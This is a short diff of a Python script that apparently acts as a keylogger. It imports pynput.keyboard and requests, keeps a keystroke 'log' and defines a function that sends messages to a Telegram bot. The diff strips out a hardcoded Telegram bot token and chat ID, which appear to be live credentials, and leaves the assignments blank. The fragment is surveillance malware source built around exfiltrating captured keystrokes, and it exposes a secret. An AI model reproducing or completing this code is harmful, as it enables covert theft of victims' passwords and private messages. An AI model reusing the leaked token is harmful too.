@@ -2,9 +2,8 @@ import pynput.keyboard
 import threading
 import requests
 
-BOT_TOKEN = '7553480262:AAENZdOncUdATiJmev8Lpmbxd7vrfU20T9o'
-CHAT_ID = '6685240334'
-
+BOT_TOKEN = 
+CHAT_ID = 
 log = ""
 
 def send_telegram_message(message):
